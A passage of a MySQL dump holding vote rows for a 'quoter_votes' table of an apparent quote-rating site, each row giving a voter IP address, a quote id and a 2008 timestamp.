  (4020,'212.111.193.89','',0,71,1229299281),
  (4021,'91.202.197.79','',0,98,1229299393),
  (4022,'91.202.197.79','',0,21,1229300095),
  (4023,'91.202.197.79','',0,109,1229300109),
  (4024,'91.202.197.79','',0,140,1229300116),
  (4025,'91.185.51.91','',0,174,1229301397),
  (4026,'91.185.51.91','',0,170,1229301425),
  (4027,'91.185.51.91','',0,169,1229301425),
  (4028,'67.195.37.113','',0,138,1229302992),
  (4029,'77.241.45.185','',0,145,1229303785),
  (4030,'193.93.218.64','',0,169,1229304163),
  (4031,'66.249.66.47','',0,169,1229305402),
  (4032,'89.188.114.72','',0,173,1229305524),
  (4033,'89.188.114.72','',0,169,1229305560),
  (4034,'89.188.114.72','',0,165,1229305621),
  (4035,'89.188.114.72','',0,172,1229309913),
  (4036,'72.30.87.91','',0,30,1229311543),
  (4037,'95.56.8.128','',0,55,1229312388),
  (4038,'91.78.239.38','',0,61,1229312989),
  (4039,'91.78.239.38','',0,55,1229313290),
  (4040,'85.92.7.244','',0,169,1229313322),
  (4041,'91.78.239.38','',0,85,1229313382),
  (4042,'80.243.71.189','',0,173,1229313520),
  (4043,'80.243.71.189','',0,169,1229313565),
  (4044,'92.47.225.75','',0,55,1229314013),
  (4045,'92.47.225.75','',0,169,1229314119),
  (4046,'80.243.71.189','',0,1,1229314301),
  (4047,'80.243.71.189','',0,55,1229314302),
  (4048,'79.165.45.16','',0,169,1229315748),
  (4049,'212.17.7.6','',0,173,1229316187),
  (4050,'66.249.66.47','',0,168,1229316217),
  (4051,'212.17.7.6','',0,129,1229317460),
  (4052,'81.200.211.90','',0,173,1229318377),
  (4053,'80.89.145.65','',0,165,1229318674),
  (4054,'80.89.145.65','',0,164,1229318683),
  (4055,'81.200.211.90','',0,165,1229318968),
  (4056,'92.43.185.2','',0,171,1229319789),
  (4057,'93.185.182.24','',0,171,1229319830),
  (4058,'93.185.182.24','',0,175,1229319847),
  (4059,'93.185.182.24','',0,168,1229319862),
  (4060,'80.243.71.189','',0,175,1229320412),
  (4061,'91.206.146.61','',0,169,1229321477),
  (4062,'66.249.66.47','',0,164,1229322118),
  (4063,'195.189.82.26','',0,168,1229323254),
  (4064,'195.189.82.26','',0,109,1229323489),
  (4065,'67.195.37.113','',0,136,1229324158),
  (4066,'193.93.218.64','',0,169,1229324192),
  (4067,'79.171.124.126','',0,153,1229324278),
  (4068,'80.89.145.65','',0,172,1229324481),
  (4069,'80.89.145.65','',0,147,1229324521),
  (4070,'80.89.145.65','',0,87,1229324535),
  (4071,'80.89.145.65','',0,29,1229324664),
  (4072,'80.89.145.65','',0,18,1229324683),
  (4073,'83.221.204.86','',0,169,1229324693),
  (4074,'80.89.145.65','',0,56,1229324695),
  (4075,'83.221.204.86','',0,140,1229325142),
  (4076,'213.184.248.166','',0,141,1229325231),
  (4077,'87.118.102.154','',0,141,1229325287),
  (4078,'72.30.79.92','',0,156,1229325418),
  (4079,'213.234.196.39','',0,169,1229326384),
  (4080,'213.234.196.39','',0,154,1229326583),
  (4081,'217.65.14.16','',0,169,1229326622),
  (4082,'195.69.221.234','',0,173,1229326837),
  (4083,'217.65.14.16','',0,159,1229326854),
  (4084,'217.65.14.16','',0,155,1229326942),
  (4085,'194.88.210.254','',0,55,1229327670),
  (4086,'81.25.39.91','',0,160,1229327691),
  (4087,'66.249.66.47','',0,163,1229327811),
  (4088,'66.249.66.47','',0,169,1229327857),
  (4089,'62.5.199.194','',0,164,1229328163),
  (4090,'94.51.227.150','',0,169,1229328220),
  (4091,'62.5.199.194','',0,120,1229328286),
  (4092,'62.5.199.194','',0,109,1229328299),
  (4093,'62.5.199.194','',0,95,1229328402),
  (4094,'81.25.39.91','',0,168,1229328426),
  (4095,'62.5.199.194','',0,115,1229328427),
  (4096,'62.5.199.194','',0,169,1229328485),
  (4097,'217.15.178.67','',0,169,1229328690),
  (4098,'81.28.176.114','',0,87,1229328704),
  (4099,'81.28.176.114','',0,54,1229328739),
  (4100,'66.249.66.47','',0,165,1229328802),
  (4101,'81.25.39.91','',0,172,1229328877),
  (4102,'81.25.39.91','',0,173,1229328991),
  (4103,'81.25.39.91','',0,175,1229329013),
  (4104,'81.25.39.91','',0,120,1229329042),
  (4105,'81.25.39.91','',0,140,1229329087),
  (4106,'92.46.30.80','',0,55,1229329146),
  (4107,'66.249.66.47','',0,168,1229329175),
  (4108,'92.46.30.80','',0,175,1229329185),
  (4109,'92.46.30.80','',0,172,1229329196),
  (4110,'194.186.200.82','',0,118,1229329481),
  (4111,'194.186.200.82','',0,110,1229329485),
  (4112,'89.237.246.242','',0,55,1229330546),
  (4113,'87.249.58.45','',0,169,1229331493),
  (4114,'213.184.248.166','',0,1,1229332000),
  (4115,'213.184.248.166','',0,55,1229332275),
  (4116,'213.184.248.166','',0,29,1229332317),
  (4117,'213.184.248.166','',0,21,1229332354),
  (4118,'213.184.248.166','',0,18,1229332373),
  (4119,'213.184.248.166','',0,56,1229332403),
  (4120,'213.184.248.166','',0,120,1229332435),
  (4121,'213.184.248.166','',0,109,1229332456),
  (4122,'213.184.248.166','',0,140,1229332503),
  (4123,'213.184.248.166','',0,93,1229332556),
  (4124,'213.184.248.166','',0,141,1229332599),
  (4125,'213.184.248.166','',0,119,1229332612),
  (4126,'213.184.248.166','',0,111,1229332632),
  (4127,'213.184.248.166','',0,107,1229332646),
  (4128,'212.179.135.226','',0,176,1229332666),
  (4129,'213.184.248.166','',0,95,1229332683),
  (4130,'213.184.248.166','',0,133,1229332706),
  (4131,'212.55.66.18','',0,169,1229332808),
  (4132,'213.184.248.166','',0,165,1229332836),
  (4133,'213.184.248.166','',0,164,1229332841),
  (4134,'213.184.248.166','',0,173,1229332851),
  (4135,'213.184.248.166','',0,175,1229332889),
  (4136,'213.184.248.166','',0,172,1229332902),
  (4137,'213.184.248.166','',0,168,1229332979),
  (4138,'66.249.66.47','',0,119,1229333046),
  (4139,'213.184.248.166','',0,171,1229333047),
  (4140,'213.184.248.166','',0,176,1229333139),
  (4141,'212.143.217.1','',0,169,1229333167),
  (4142,'212.143.217.1','',0,162,1229333233),
  (4143,'87.119.238.9','',0,155,1229333247),
  (4144,'212.143.217.1','',0,160,1229333254),
  (4145,'213.184.248.166','',0,177,1229333258),
  (4146,'212.143.217.1','',0,155,1229333278),
  (4147,'213.184.248.166','',0,169,1229333304),
  (4148,'86.57.196.237','',0,177,1229333355),
  (4149,'213.184.248.166','',0,161,1229333369),
  (4150,'213.184.248.166','',0,160,1229333405),
  (4151,'213.184.248.166','',0,159,1229333551),
  (4152,'92.46.68.250','',0,177,1229333563),
  (4153,'86.57.196.237','',0,169,1229333575),
  (4154,'86.57.196.237','',0,165,1229333624),
  (4155,'86.57.196.237','',0,141,1229334042),
  (4156,'86.57.196.237','',0,133,1229334149),
  (4157,'86.57.196.237','',0,120,1229334209),
  (4158,'213.184.248.166','',0,156,1229334533),
  (4159,'213.184.248.166','',0,155,1229334563),
  (4160,'213.184.248.166','',0,154,1229334626),
  (4161,'86.57.196.237','',0,69,1229334699),
  (4162,'213.184.248.166','',0,146,1229334716),
  (4163,'86.57.196.237','',0,67,1229334732),
  (4164,'156.17.237.13','',0,176,1229334800),
  (4165,'156.17.237.13','',0,175,1229334823),
  (4166,'156.17.237.13','',0,173,1229334826),
  (4167,'85.249.145.190','',0,120,1229334917),
  (4168,'213.184.248.166','',0,137,1229334960),
  (4169,'213.184.248.166','',0,124,1229335009),
  (4170,'86.57.196.237','',0,66,1229335023),
  (4171,'213.184.248.166','',0,115,1229335062),
  (4172,'86.57.196.237','',0,39,1229335175),
  (4173,'82.200.102.110','',0,169,1229335333),
  (4174,'86.57.196.237','',0,23,1229335416),
  (4175,'89.208.20.114','',0,173,1229335444),
  (4176,'89.208.20.114','',0,120,1229335529),
  (4177,'89.208.20.114','',0,140,1229335545),
  (4178,'89.208.20.114','',0,93,1229335567),
  (4179,'89.208.20.114','',0,111,1229335586),
  (4180,'89.208.20.114','',0,119,1229335593),
  (4181,'89.208.20.114','',0,107,1229335629),
  (4182,'89.208.20.114','',0,95,1229335650),
  (4183,'89.208.20.114','',0,55,1229335659),
  (4184,'89.208.20.114','',0,1,1229335664),
  (4185,'89.208.20.114','',0,29,1229335676),
  (4186,'85.91.110.150','',0,160,1229336322),
  (4187,'213.184.248.166','',0,105,1229336377),
  (4188,'78.86.113.42','',0,119,1229336402),
  (4189,'213.184.248.166','',0,104,1229336428),
  (4190,'213.184.248.166','',0,103,1229336463),
  (4191,'213.184.248.166','',0,98,1229336504),
  (4192,'213.184.248.166','',0,83,1229336570),
  (4193,'85.91.110.150','',0,140,1229336664),
  (4194,'208.115.138.254','',0,173,1229337870),
  (4195,'213.137.232.149','',0,173,1229337871),
  (4196,'92.46.30.80','',0,55,1229338288),
  (4197,'212.179.135.226','',0,177,1229338472),
  (4198,'91.195.22.32','',0,165,1229338543),
  (4199,'78.86.113.42','',0,125,1229338619),
  (4200,'62.231.8.74','',0,95,1229338817),
  (4201,'78.36.121.66','',0,172,1229338878),
  (4202,'78.36.121.66','',0,54,1229338923),
  (4203,'78.24.227.202','',0,55,1229339655),
  (4204,'78.24.227.202','',0,1,1229339656),
  (4205,'78.24.227.202','',0,29,1229339660),
  (4206,'91.202.197.79','',0,175,1229339850),
  (4207,'84.204.148.130','',0,76,1229340047),
  (4208,'84.204.148.130','',0,21,1229340163),
  (4209,'94.248.99.122','',0,165,1229340179),
  (4210,'66.249.66.47','',0,122,1229340700),
  (4211,'72.30.142.220','',0,163,1229340854),
  (4212,'213.207.131.194','',0,175,1229341286),
  (4213,'85.223.209.2','',0,177,1229341426),
  (4214,'85.223.209.2','',0,176,1229341449),
  (4215,'85.223.209.2','',0,175,1229341461),
  (4216,'85.223.209.2','',0,173,1229341468),
  (4217,'72.30.142.220','',0,175,1229341499),
  (4218,'72.30.142.220','',0,173,1229341531),
  (4219,'72.30.142.220','',0,171,1229341578),
  (4220,'72.30.142.220','',0,177,1229341607),
  (4221,'72.30.142.220','',0,172,1229341624),
  (4222,'72.30.142.250','',0,176,1229341734),
  (4223,'78.37.53.19','',0,171,1229341745),
  (4224,'78.37.53.19','',0,168,1229341754),
  (4225,'72.30.142.250','',0,173,1229341927),
  (4226,'72.30.142.250','',0,168,1229342008),
  (4227,'217.170.83.214','',0,173,1229342145),
  (4228,'72.30.142.250','',0,164,1229342154),
  (4229,'81.200.211.90','',0,61,1229342212),
  (4230,'72.30.142.250','',0,157,1229342239),
  (4231,'81.200.211.90','',0,173,1229342427),
  (4232,'87.249.58.45','',0,171,1229342856),
  (4233,'195.98.50.58','',0,173,1229343051),
  (4234,'195.98.50.58','',0,117,1229343117),
  (4235,'81.26.156.31','',0,176,1229343191),
  (4236,'195.98.50.58','',0,61,1229343229),
  (4237,'195.98.50.58','',0,54,1229343326),
  (4238,'66.249.66.47','',0,119,1229343764),
  (4239,'213.184.248.166','',0,80,1229343926),
  (4240,'66.249.66.47','',0,49,1229343962),
  (4241,'213.184.248.166','',0,69,1229343977),
  (4242,'213.184.248.166','',0,68,1229344001),
  (4243,'213.184.248.166','',0,67,1229344024),
  (4244,'213.184.248.166','',0,66,1229344061),
  (4245,'213.184.248.166','',0,63,1229344092),
  (4246,'213.184.248.166','',0,53,1229344111),
  (4247,'213.184.248.166','',0,39,1229344123),
  (4248,'213.184.248.166','',0,29,1229344199),
  (4249,'213.184.248.166','',0,38,1229344206),
  (4250,'87.117.57.73','',0,177,1229344234),
  (4251,'87.226.164.162','',0,171,1229345343),
  (4252,'217.73.131.71','',0,120,1229345385),
  (4253,'74.6.17.173','',0,177,1229345496),
  (4254,'217.159.130.58','',0,177,1229345720),
  (4255,'217.159.130.58','',0,176,1229345728),
  (4256,'217.159.130.58','',0,172,1229345772),
  (4257,'217.159.130.58','',0,164,1229345810),
  (4258,'217.159.130.58','',0,168,1229345831),
  (4259,'217.159.130.58','',0,161,1229345864),
  (4260,'217.159.130.58','',0,157,1229345927),
  (4261,'217.159.130.58','',0,156,1229345930),
  (4262,'217.159.130.58','',0,154,1229345982),
  (4263,'217.159.130.58','',0,146,1229346017),
  (4264,'217.159.130.58','',0,141,1229346059),
  (4265,'217.159.130.58','',0,140,1229346089),
  (4266,'217.159.130.58','',0,137,1229346180),
  (4267,'217.159.130.58','',0,124,1229346189),
  (4268,'217.159.130.58','',0,113,1229346257),
  (4269,'217.159.130.58','',0,88,1229346274),
  (4270,'217.159.130.58','',0,87,1229346281),
  (4271,'91.202.197.79','',0,160,1229346531),
  (4272,'213.184.232.37','',0,173,1229346571),
  (4273,'213.184.232.37','',0,172,1229346582),
  (4274,'213.184.232.37','',0,171,1229346594),
  (4275,'213.184.232.37','',0,168,1229346607),
  (4276,'213.184.232.37','',0,164,1229346629),
  (4277,'213.184.232.37','',0,73,1229346855),
  (4278,'213.184.232.37','',0,136,1229346897),
  (4279,'213.184.232.37','',0,135,1229346909),
  (4280,'91.195.53.2','',0,173,1229347101),
  (4281,'132.66.126.46','',0,164,1229347504),
  (4282,'132.66.126.46','',0,168,1229347570),
  (4283,'81.21.247.108','',0,120,1229347906),
  (4284,'81.21.247.108','',0,115,1229347909),
  (4285,'91.195.53.2','',0,61,1229347997),
  (4286,'79.133.75.58','',0,173,1229348941),
  (4287,'79.133.75.58','',0,168,1229349003),
  (4288,'79.133.75.58','',0,171,1229349008),
  (4289,'79.133.75.58','',0,165,1229349032),
  (4290,'212.3.144.148','',0,168,1229349034),
  (4291,'212.3.144.148','',0,160,1229349210),
  (4292,'91.185.55.3','',0,171,1229349293),
  (4293,'80.255.64.192','',0,175,1229349605),
  (4294,'212.3.144.148','',0,140,1229349609),
  (4295,'80.255.64.192','',0,173,1229349620),
  (4296,'94.41.34.34','',0,171,1229349736),
  (4297,'81.25.42.46','',0,172,1229349775),
  (4298,'91.202.197.79','',0,20,1229349804),
  (4299,'94.41.34.34','',0,160,1229349845),
  (4300,'91.202.197.79','',0,173,1229349902),
  (4301,'91.202.197.79','',0,176,1229349929),
  (4302,'194.158.203.2','',0,173,1229350138),
  (4303,'89.208.20.114','',0,171,1229350225),
  (4304,'89.208.20.114','',0,162,1229350295),
  (4305,'89.208.20.114','',0,160,1229350347),
  (4306,'79.133.75.58','',0,178,1229350412),
  (4307,'212.98.179.118','',0,168,1229351187),
  (4308,'72.30.142.92','',0,171,1229351211),
  (4309,'212.98.179.118','',0,176,1229351232),
  (4310,'212.98.179.118','',0,177,1229351237),
  (4311,'212.98.179.118','',0,178,1229351238),
  (4312,'212.98.179.118','',0,171,1229351256),
  (4313,'195.234.70.194','',0,180,1229351257),
  (4314,'212.176.211.125','',0,23,1229351271),
  (4315,'212.98.179.118','',0,165,1229351330),
  (4316,'212.98.179.118','',0,164,1229351334),
  (4317,'212.98.179.118','',0,160,1229351523),
  (4318,'193.93.218.64','',0,171,1229351762),
  (4319,'212.98.179.118','',0,143,1229351850),
  (4320,'212.98.179.118','',0,142,1229351864),
  (4321,'212.98.179.118','',0,140,1229351920),
  (4322,'212.98.179.118','',0,139,1229351945),
  (4323,'217.199.214.30','',0,93,1229352176),
  (4324,'66.249.66.47','',0,49,1229352289),
  (4325,'217.199.214.30','',0,55,1229352630),
  (4326,'94.248.99.122','',0,165,1229352892),
  (4327,'94.248.99.122','',0,107,1229352972),
  (4328,'217.199.214.30','',0,6,1229353033),
  (4329,'67.202.43.229','',0,115,1229353901),
  (4330,'67.202.43.229','',0,54,1229353926),
  (4331,'72.30.161.217','',0,165,1229354570),
  (4332,'212.98.163.238','',0,183,1229354638),
  (4333,'82.116.46.212','',0,94,1229354969),
  (4334,'87.225.47.163','',0,163,1229356055),
  (4335,'91.78.236.150','',0,178,1229356078),
  (4336,'91.78.236.150','',0,117,1229356099),
  (4337,'91.78.236.150','',0,61,1229356209),
  (4338,'195.14.49.230','',0,185,1229357032),
  (4339,'195.14.49.230','',0,186,1229357045),
  (4340,'195.14.49.230','',0,184,1229357056),
  (4341,'195.14.49.230','',0,182,1229357060),
  (4342,'195.14.49.230','',0,181,1229357063),
  (4343,'195.14.49.230','',0,180,1229357068),
  (4344,'195.14.49.230','',0,179,1229357071),
  (4345,'195.14.49.230','',0,178,1229357074),
  (4346,'195.14.49.230','',0,177,1229357079),
  (4347,'67.159.44.138','',0,185,1229357152),
  (4348,'212.98.163.238','',0,187,1229357588),
  (4349,'212.98.163.238','',0,186,1229357593),
  (4350,'82.144.201.65','',0,177,1229358732),
  (4351,'82.144.201.65','',0,176,1229358743),
  (4352,'77.222.156.218','',0,168,1229359782),
  (4353,'93.94.233.232','',0,179,1229359868),
  (4354,'93.94.233.232','',0,180,1229359871),
  (4355,'212.98.163.238','',0,184,1229359997),
  (4356,'66.249.66.47','',0,74,1229360144),
  (4357,'77.222.156.218','',0,175,1229360461),
  (4358,'77.222.156.218','',0,176,1229360467),
  (4359,'77.222.156.218','',0,185,1229360502),
  (4360,'89.113.128.63','',0,173,1229361171),
  (4361,'94.248.99.122','',0,165,1229361290),
  (4362,'87.249.58.45','',0,186,1229361907),
  (4363,'87.249.58.45','',0,187,1229361921),
  (4364,'87.249.58.45','',0,182,1229362027),
  (4365,'87.249.58.45','',0,179,1229362060),
  (4366,'87.249.58.45','',0,168,1229362097),
  (4367,'87.249.58.45','',0,162,1229362124),
  (4368,'87.249.58.45','',0,163,1229362126),
  (4369,'87.249.58.45','',0,160,1229362137),
  (4370,'82.207.125.180','',0,187,1229362402),
  (4371,'82.207.125.180','',0,185,1229362415),
  (4372,'89.188.114.72','',0,187,1229362808),
  (4373,'87.118.115.69','',0,186,1229362814),
  (4374,'89.188.114.72','',0,185,1229362877),
  (4375,'89.188.114.72','',0,186,1229362882),
  (4376,'89.188.114.72','',0,182,1229363181),
  (4377,'89.188.114.72','',0,176,1229363262),
  (4378,'89.188.114.72','',0,173,1229363316),
  (4379,'93.185.182.24','',0,185,1229363729),
  (4380,'66.249.66.47','',0,80,1229364013),
  (4381,'87.249.58.45','',0,185,1229365652),
  (4382,'87.249.58.45','',0,180,1229365697),
  (4383,'79.165.45.16','',0,187,1229366020),
  (4384,'79.165.45.16','',0,186,1229366026),
  (4385,'194.158.194.187','',0,141,1229366079),
  (4386,'79.165.45.16','',0,182,1229366111),
  (4387,'79.165.45.16','',0,181,1229366121),
  (4388,'79.165.45.16','',0,179,1229366130),
  (4389,'79.165.45.16','',0,180,1229366133),
  (4390,'92.124.180.216','',0,105,1229366395),
  (4391,'92.124.180.216','',0,104,1229366398),
  (4392,'92.124.180.216','',0,109,1229366412),
  (4393,'217.118.90.232','',0,55,1229367681),
  (4394,'79.171.124.126','',0,184,1229368427),
  (4395,'79.171.124.126','',0,178,1229368485),
  (4396,'94.29.101.70','',0,188,1229369059),
  (4397,'94.29.101.70','',0,187,1229369071),
  (4398,'94.29.101.70','',0,186,1229369083),
  (4399,'94.29.101.70','',0,185,1229369120),
  (4400,'213.178.38.94','',0,3,1229370040),
  (4401,'193.27.209.200','',0,188,1229370376),
  (4402,'193.27.209.200','',0,187,1229370390),
  (4403,'79.120.80.135','',0,162,1229370394),
  (4404,'193.27.209.200','',0,186,1229370403),
  (4405,'193.27.209.200','',0,185,1229370427),
  (4406,'193.27.209.200','',0,183,1229370458),
  (4407,'193.27.209.200','',0,181,1229370479),
  (4408,'193.27.209.200','',0,180,1229370493),
  (4409,'193.27.209.200','',0,179,1229370522),
  (4410,'66.249.66.47','',0,18,1229370543),
  (4411,'193.27.209.200','',0,178,1229370648),
  (4412,'193.27.209.200','',0,173,1229370693),
  (4413,'94.30.130.152','',0,152,1229373116),
  (4414,'217.10.42.156','',0,140,1229374998),
  (4415,'213.130.24.157','',0,187,1229375008),
  (4416,'93.172.195.24','',0,188,1229375227),
  (4417,'93.172.195.24','',0,187,1229375239),
  (4418,'93.172.195.24','',0,185,1229375303),
  (4419,'93.172.195.24','',0,178,1229375527),
  (4420,'93.172.195.24','',0,165,1229376094),
  (4421,'156.17.237.13','',0,186,1229376328),
  (4422,'213.130.24.157','',0,160,1229376517),
  (4423,'213.130.24.157','',0,157,1229376561),
  (4424,'85.140.25.119','',0,159,1229376595),
  (4425,'89.104.114.70','',0,157,1229378024),
  (4426,'194.44.190.164','',0,177,1229378710),
  (4427,'194.44.190.164','',0,180,1229378752),
  (4428,'194.44.190.164','',0,163,1229378765),
  (4429,'194.44.190.164','',0,133,1229378837),
  (4430,'194.44.190.164','',0,111,1229378878),
  (4431,'89.222.133.50','',0,187,1229379481),
  (4432,'80.237.112.245','',0,186,1229379548),
  (4433,'66.249.66.47','',0,98,1229379962),
  (4434,'66.249.66.47','',0,94,1229379973),
  (4435,'66.249.66.47','',0,95,1229379981),
  (4436,'66.249.66.47','',0,93,1229380153),
  (4437,'66.249.66.47','',0,99,1229380173),
  (4438,'66.249.66.47','',0,146,1229380197),
  (4439,'66.249.66.47','',0,147,1229380227),
  (4440,'66.249.66.47','',0,143,1229380263),
  (4441,'66.249.66.47','',0,145,1229380273),
  (4442,'66.249.66.47','',0,144,1229380375),
  (4443,'66.249.66.47','',0,96,1229380410),
  (4444,'66.249.66.47','',0,96,1229380410),
  (4445,'66.249.66.47','',0,140,1229380488),
  (4446,'66.249.66.47','',0,142,1229380536),
  (4447,'66.249.66.47','',0,141,1229380559),
  (4448,'66.249.66.47','',0,100,1229380573),
  (4449,'95.28.69.171','',0,188,1229380657),
  (4450,'95.28.69.171','',0,178,1229380803),
  (4451,'95.28.69.171','',0,173,1229380854),
  (4452,'95.28.69.171','',0,172,1229380864),
  (4453,'95.28.69.171','',0,145,1229381128),
  (4454,'95.28.69.171','',0,138,1229381187),
  (4455,'94.253.22.150','',0,182,1229382495),
  (4456,'94.253.22.150','',0,185,1229382668),
  (4457,'94.253.22.150','',0,177,1229382680),
  (4458,'94.253.22.150','',0,55,1229382723),
  (4459,'94.253.22.150','',0,184,1229382842),
  (4460,'94.253.22.150','',0,187,1229382856),
  (4461,'195.161.70.250','',0,178,1229387712),
  (4462,'195.161.70.250','',0,173,1229387728),
  (4463,'195.161.70.250','',0,186,1229387814),
  (4464,'66.249.66.47','',0,177,1229387869),
  (4465,'195.131.87.152','',0,12,1229388863),
  (4466,'195.131.87.152','',0,62,1229388969),
  (4467,'66.249.66.47','',0,176,1229392012),
  (4468,'89.251.107.19','',0,185,1229393804),
  (4469,'89.251.107.19','',0,176,1229393951),
  (4470,'89.251.107.19','',0,178,1229393982),
  (4471,'80.243.71.189','',0,189,1229394670),
  (4472,'80.243.71.189','',0,187,1229394679),
  (4473,'80.243.71.189','',0,1,1229394979),
  (4474,'80.243.71.189','',0,55,1229394983),
  (4475,'80.243.71.189','',0,164,1229395007),
  (4476,'66.249.66.47','',0,177,1229403023),
  (4477,'174.36.207.234','',0,189,1229404691),
  (4478,'174.36.207.234','',0,188,1229404696),
  (4479,'174.36.207.234','',0,187,1229404701),
  (4480,'174.36.207.234','',0,186,1229404707),
  (4481,'174.36.207.234','',0,185,1229404712),
  (4482,'174.36.207.234','',0,184,1229404717),
  (4483,'174.36.207.234','',0,183,1229404722),
  (4484,'174.36.207.234','',0,182,1229404728),
  (4485,'174.36.207.234','',0,181,1229404736),
  (4486,'174.36.207.234','',0,180,1229404743),
  (4487,'174.36.207.234','',0,177,1229404782),
  (4488,'174.36.207.234','',0,176,1229404787),
  (4489,'174.36.207.234','',0,175,1229404793),
  (4490,'174.36.207.234','',0,178,1229404798),
  (4491,'174.36.207.234','',0,172,1229404805),
  (4492,'174.36.207.234','',0,168,1229404811),
  (4493,'174.36.207.234','',0,164,1229404815),
  (4494,'174.36.207.234','',0,161,1229404822),
  (4495,'174.36.207.234','',0,159,1229404826),
  (4496,'81.200.211.90','',0,188,1229404853),
  (4497,'174.36.207.234','',0,173,1229404853),
  (4498,'174.36.207.234','',0,129,1229404859),
  (4499,'174.36.207.234','',0,117,1229404867),
  (4500,'81.200.211.90','',0,187,1229404869);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 4500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (4501,'81.200.211.90','',0,186,1229404878),
  (4502,'174.36.207.234','',0,106,1229404883),
  (4503,'174.36.207.234','',0,163,1229404892),
  (4504,'174.36.207.234','',0,162,1229404897),
  (4505,'81.200.211.90','',0,178,1229404899),
  (4506,'81.200.211.90','',0,175,1229404901),
  (4507,'174.36.207.234','',0,143,1229404903),
  (4508,'81.200.211.90','',0,173,1229404903),
  (4509,'174.36.207.234','',0,139,1229404910),
  (4510,'81.200.211.90','',0,129,1229404915),
  (4511,'174.36.207.234','',0,133,1229404915),
  (4512,'81.200.211.90','',0,106,1229404920),
  (4513,'174.36.207.234','',0,111,1229404922),
  (4514,'174.36.207.234','',0,89,1229404928),
  (4515,'81.200.211.90','',0,90,1229404931),
  (4516,'174.36.207.234','',0,77,1229404933),
  (4517,'174.36.207.234','',0,70,1229404939),
  (4518,'174.36.207.234','',0,179,1229404951),
  (4519,'174.36.207.234','',0,171,1229404958),
  (4520,'174.36.207.234','',0,165,1229404963),
  (4521,'174.36.207.234','',0,145,1229404967),
  (4522,'174.36.207.234','',0,142,1229404974),
  (4523,'174.36.207.234','',0,122,1229404978),
  (4524,'174.36.207.234','',0,119,1229404985),
  (4525,'174.36.207.234','',0,96,1229404989),
  (4526,'174.36.207.234','',0,79,1229404995),
  (4527,'174.36.207.234','',0,56,1229405002),
  (4528,'174.36.207.234','',0,128,1229405012),
  (4529,'174.36.207.234','',0,108,1229405017),
  (4530,'174.36.207.234','',0,94,1229405021),
  (4531,'174.36.207.234','',0,86,1229405027),
  (4532,'174.36.207.234','',0,76,1229405032),
  (4533,'174.36.207.234','',0,75,1229405037),
  (4534,'174.36.207.234','',0,71,1229405044),
  (4535,'174.36.207.234','',0,48,1229405050),
  (4536,'174.36.207.234','',0,30,1229405057),
  (4537,'174.36.207.234','',0,118,1229405067),
  (4538,'174.36.207.234','',0,110,1229405074),
  (4539,'174.36.207.234','',0,74,1229405079),
  (4540,'174.36.207.234','',0,24,1229405084),
  (4541,'174.36.207.234','',0,23,1229405090),
  (4542,'174.36.207.234','',0,144,1229405097),
  (4543,'174.36.207.234','',0,130,1229405106),
  (4544,'174.36.207.234','',0,85,1229405109),
  (4545,'174.36.207.234','',0,84,1229405114),
  (4546,'174.36.207.234','',0,12,1229405120),
  (4547,'174.36.207.234','',0,152,1229405128),
  (4548,'174.36.207.234','',0,125,1229405134),
  (4549,'174.36.207.234','',0,99,1229405141),
  (4550,'174.36.207.234','',0,62,1229405145),
  (4551,'174.36.207.234','',0,50,1229405151),
  (4552,'174.36.207.234','',0,147,1229405157),
  (4553,'174.36.207.234','',0,113,1229405167),
  (4554,'174.36.207.234','',0,88,1229405173),
  (4555,'174.36.207.234','',0,87,1229405179),
  (4556,'174.36.207.234','',0,54,1229405185),
  (4557,'174.36.207.234','',0,136,1229405192),
  (4558,'174.36.207.234','',0,135,1229405198),
  (4559,'174.36.207.234','',0,73,1229405203),
  (4560,'174.36.207.234','',0,58,1229405209),
  (4561,'174.36.207.234','',0,44,1229405214),
  (4562,'174.36.207.234','',0,138,1229405222),
  (4563,'174.36.207.234','',0,100,1229405227),
  (4564,'174.36.207.234','',0,60,1229405237),
  (4565,'174.36.207.234','',0,55,1229405243),
  (4566,'174.36.207.234','',0,134,1229405253),
  (4567,'174.36.207.234','',0,157,1229405270),
  (4568,'174.36.207.234','',0,156,1229405276),
  (4569,'174.36.207.234','',0,155,1229405285),
  (4570,'174.36.207.234','',0,154,1229405294),
  (4571,'174.36.207.234','',0,146,1229405303),
  (4572,'174.36.207.234','',0,141,1229405310),
  (4573,'174.36.207.234','',0,140,1229405319),
  (4574,'174.36.207.234','',0,137,1229405330),
  (4575,'174.36.207.234','',0,124,1229405338),
  (4576,'174.36.207.234','',0,4,1229405350),
  (4577,'174.36.207.234','',0,3,1229405356),
  (4578,'174.36.207.234','',0,2,1229405363),
  (4579,'174.36.207.234','',0,1,1229405371),
  (4580,'174.36.207.234','',0,120,1229405394),
  (4581,'174.36.207.234','',0,109,1229405400),
  (4582,'174.36.207.234','',0,93,1229405412),
  (4583,'174.36.207.234','',0,107,1229405418),
  (4584,'174.36.207.234','',0,29,1229405425),
  (4585,'174.36.207.234','',0,21,1229405440),
  (4586,'174.36.207.234','',0,18,1229405448),
  (4587,'174.36.207.234','',0,115,1229405555),
  (4588,'174.36.207.234','',0,114,1229405564),
  (4589,'174.36.207.234','',0,105,1229405571),
  (4590,'174.36.207.234','',0,104,1229405580),
  (4591,'174.36.207.234','',0,103,1229405588),
  (4592,'174.36.207.234','',0,98,1229405594),
  (4593,'174.36.207.234','',0,95,1229405602),
  (4594,'174.36.207.234','',0,83,1229405608),
  (4595,'174.36.207.234','',0,81,1229405617),
  (4596,'174.36.207.234','',0,80,1229405628),
  (4597,'174.36.207.234','',0,69,1229405636),
  (4598,'174.36.207.234','',0,68,1229405648),
  (4599,'174.36.207.234','',0,67,1229405657),
  (4600,'174.36.207.234','',0,66,1229405667),
  (4601,'174.36.207.234','',0,63,1229405676),
  (4602,'174.36.207.234','',0,53,1229405682),
  (4603,'174.36.207.234','',0,39,1229405689),
  (4604,'174.36.207.234','',0,38,1229405698),
  (4605,'81.27.49.106','',0,188,1229405700),
  (4606,'174.36.207.234','',0,25,1229405706),
  (4607,'174.36.207.234','',0,20,1229405719),
  (4608,'174.36.207.234','',0,13,1229405729),
  (4609,'174.36.207.234','',0,11,1229405734),
  (4610,'81.27.49.106','',0,180,1229405908),
  (4611,'81.27.49.106','',0,183,1229405932),
  (4612,'81.27.49.106','',0,178,1229405943),
  (4613,'81.27.49.106','',0,175,1229405953),
  (4614,'81.27.49.106','',0,173,1229405963),
  (4615,'81.27.49.106','',0,117,1229405995),
